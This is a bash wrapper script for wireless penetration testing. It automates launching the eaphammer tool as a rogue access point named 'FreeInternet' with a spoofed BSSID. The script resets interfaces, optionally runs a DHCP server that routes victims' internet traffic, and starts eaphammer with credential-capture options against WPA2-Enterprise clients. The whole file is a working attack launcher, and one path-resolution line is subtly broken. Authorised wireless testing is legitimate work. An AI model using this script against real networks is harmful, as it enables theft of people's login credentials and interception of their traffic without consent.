#!/bin/bash

#
# This script launches `eaphammer` tool by s0lst1c3, available from:
#	https://github.com/s0lst1c3/eaphammer.git
#
# The tool is a great way to manage hostapd-wpe server as well as perform
# additional attacks around the concept. Although when used in penetration
# testing assignments, the tool may not be as reliable as believed due to
# various nuances with WLAN interface being blocked, not reloaded,
# DHCP-forced and so on. This is where this script comes in - it tries to
# automatize those steps before launching the tool and after.
#
# Especially handy when used with companion script called:
#	`initDHCPServer.sh`
#
# Mariusz Banach / mgeeky '18, <mb@binary-offensive.com>
#

####################################################################
# CONFIGURATION

# Name of offered Fake/Rouge AP
ESSID=FreeInternet

# MAC Address of Fake/Rouge AP
BSSID=24:01:c7:31:13:37

# Channel
CH=10

# Additional `eaphammer` options to pass.
EAPHAMMER_OPTS="--creds --wpa 2 --auth ttls"

# Wireless interface to use for Rogue/Fake AP purposes.
WLAN_IFACE=wlan0

# [optional] Outbound to WAN interface (default gateway) where to pass victim's 
# internet connection. If not specified, there will be no IP forwarding set.
OUTBOUND_IFACE=

# Directory in which `eaphammer` has been installed/cloned.
EAPHAMMER_DIR=/root/tools/eaphammer

# [optional] Directory with this very script. Needed to find `initDHCPServer.sh` companion
# script. If not specified, will try to use this script's current working directory.
THIS_SCRIPT_DIR=/root/vmshared/wifiPentest

####################################################################


echo "[STEP 0]: Preliminary cleanup"
pkill dhclient 
pkill dhcpd 

echo "[STEP 1]: nl802111 driver Bug workaround"
nmcli radio wifi off
rfkill unblock wlan

echo "[STEP 2]: Reloading wireless interface"
ifconfig $WLAN_IFACE down
ifconfig $WLAN_IFACE up
sleep 2

echo "[STEP 3]: Reloading outbound interface."
if [ -n "$OUTBOUND_IFACE" ]; then
	dhclient -r $OUTBOUND_IFACE
	dhclient -v $OUTBOUND_IFACE 2>&1 | grep 'bound to'
else
	echo "No outbound interface specified. Skipping step..."
fi

echo "[STEP 4]: Starting DHCP launch script in background"
if [ -n "$OUTBOUND_IFACE" ]; then
	if [ -z "$THIS_SCRIPT_DIR" ]; then
		THIS_SCRIPT_DIR="$( cd "$(dirname "{BASH_SOURCE[0]}" )" && pwd)"
	fi
	eval "$THIS_SCRIPT_DIR/initDHCPServer.sh $WLAN_IFACE $OUTBOUND_IFACE" &disown;
else
	echo "No outbound interface specified. Skipping step..."
fi

pushd $EAPHAMMER_DIR > /dev/null
echo "[STEP 5]: Starting eaphammer with options: '$EAPHAMMER_OPTS'"

####################################################################

./eaphammer -i $WLAN_IFACE -e $ESSID -b $BSSID -c $CH $EAPHAMMER_OPTS

####################################################################

popd > /dev/null

echo "[STEP 6]: Killing services."
pkill dhclient
pkill dhcpd
